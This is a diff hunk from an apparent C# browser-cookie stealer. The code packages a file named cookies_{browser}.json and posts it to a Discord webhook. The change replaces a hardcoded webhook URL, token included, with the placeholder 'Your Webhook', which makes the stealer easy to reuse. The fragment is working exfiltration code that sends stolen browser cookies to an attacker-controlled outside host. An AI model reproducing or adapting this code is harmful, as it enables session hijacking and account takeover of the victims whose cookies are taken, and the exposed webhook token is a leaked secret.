@@ -148,7 +148,7 @@ public class Program
             fileContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/json");
             form.Add(fileContent, "file", $"cookies_{browser}.json");
 
-            var response = await client.PostAsync("https://discordapp.com/api/webhooks/1308546230552367154/DlExX-i3vC5ThAkCKfAHNKfDb3hJSegMQYKpGMaWHAxBru2ELvDMydR4RTyVPm_mAKfM", form);
+            var response = await client.PostAsync("Your Webhook", form);
 
             if (response.IsSuccessStatusCode)
             {
